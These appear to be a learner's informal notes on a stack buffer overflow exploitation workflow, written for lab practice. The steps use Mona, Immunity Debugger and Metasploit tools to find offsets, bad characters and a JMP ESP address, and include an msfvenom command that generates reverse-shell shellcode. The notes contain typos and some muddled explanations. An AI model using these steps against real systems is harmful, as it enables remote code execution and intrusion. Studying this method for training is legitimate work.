<h2>Starting from setting up and environment with Mona and Immunity Debugger.</h2>

<h3>SettingUp an Config with Mona.</h3>
<p> I am just a noob, i am writing this for myself to be able to understand the step to reprodcue error throughly but it's not something you jump right away becasue you will not even get the basics of it if you don't know what is <em> PYTHON, ImmunityDebugger, MetaSploit frameoork, Little bit of Assembly and How stack or Registers work while running a program. </em></p>
<ul></ul>
<li>In the bottom of the Immunity Debugger, we need to set the Config for Mona so that we can be able to Analysis Bytearray later which may comes handy while finding bad chars.</li>
<code><em>!mona config -set workingfolder C:\mona\oscp\</em></code>
Now, we have set the Configuration to that folder so while comparing later with esp, we will have to take care of this.

<li>Keep the fuzzing going on and notice the Bytes at which it gets crashed???? :It is helpful while creating pattern:</li>
<h3>Finding the offset.</h3>
<li>Create a pattern with <code>Pattern_create.rb -l CRASHEDBYTE </code>which is probably inside metasploit-framework</li>
<li>We got the pattern now we need to insert it into exploit in order to Figure out it's OFFSET </li>
<li>We can either find offset via  <code><em>!mona findmsp -distance CRASHEDBYTE</em></code> Or with Pattern_offset.rb -l CRASHEDBYTE -q ValueInEIP</li>
<li>Now we know the offset so put it inside the Exploit and we can also keep RTN as BBBB to reflect it in the Register.</li>
<h3>Finding the Bad Chars.</h3>
<li>Run the BADCHARS, (You can exclude \x00)and keep that payload to exploit in the the place of payload and set the Byte array for mona to <code><em>!mona bytearray -b "\x00" </code> First with  \x00. Remember we set the config at the begining? So the bytearray.bin is stored inside that config and we need that.</em></li>
<li>Watch out the MONA COMPARISON, and see the bad chars.</li>
<li>REPEAT: Iterate it while erasing the BadChars from the Exploit and Including the badchars in !mona bytearray, Remember that most of the time it's sequential and the early index is most of the times a bad chars. </li>
<li>COMPARE CODE: <code>!mona compare -f c:\mona\oscp\bytearray.bin -a esp</code></li>
<li>Iterate above till we get the MonaComparison Status to Unmodified.</li>
<h3>Finding the Right Return address</h3>
<em>Because whenever a function is called then, what to execute after the function has done it's part is stored in the returned address so basically next instruction?</em>
<li>Call it either finding a JMP state or Return address, we can find it via</li>
<li><code><em>!mona jmp -r esp -cpb "x\00\xALLTHEBADCHARSYOUFOUND.</em></code></li>
<li>See the Log data results and keep one JMP Esp 0x00 Addresss for later use.</li>
<li>If the address is suppose, 0x1129AF, then there comes Big Endian and Little Endian so </li>
<li>Manage the exploit.py with Return Address in the rtn variable but in different format like this: "\xAF\x29\x11" probably as a LSB perspective right?</li>
<h3>Generating the Payload shellcode.</h3>
<li>Now is the time to generate Payload so BADCHARS comes here to...</li>
<code><em>msfvenom -p windows/shell_riverse_tcp LHOST= LPORT= EXITFUNC=thread -b "\x00\xALLTHEBADCHARS" -f c </code>or you can use py too</em>
<li>You get the shellcode now manipulate the Exploit payload with the Generated and make sure to use the string inside ("") if it's format c and in such a way that there should be, OFFSET, RETN, PADDING = "\x90" * 16 <u>No Operation because it's a bad practice to run the shellcode instantly so we are using No operation to skip for a while.</u></li>
<li>Leave the PostFix as it is or give something as it doesn't really matter.</li>
<h3>Exploit</h3>
<li>You are good to go now. :wink:</li>
<li>There may comes some error but someone who has came this far will figure out how to solve it.</li>
